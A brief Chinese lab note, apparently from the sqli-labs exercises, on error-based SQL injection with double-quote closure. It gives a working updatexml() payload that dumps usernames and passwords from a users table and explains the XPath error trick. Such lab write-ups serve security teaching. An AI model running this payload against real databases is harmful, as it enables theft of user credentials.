## 报错注入
其实与 less-5 一样，只是用双引号闭合

在这一题尝试用新方法解决

1. 单引号闭合不报错，双引号闭合报错：use near '"1"" LIMIT 0,1' at line 1说明是用双引号闭合的

2. ```sql
   union select 1,2,updatexml('yemaster', substring(concat(0x7e, (select group_concat(username,'~',password) from users)),4,30),"aaa")
   ```

3. 就是比 extractvalue 多一项无用的参数



利用 updatexml() 报错注入，原理与 extractvalue() 一致

```
select updatexml('XML_document','Xpath_string','New_content') from xml
```

用于更新 xml 文件内容

同样在 xpath 中第一位改为 ~ 用于报错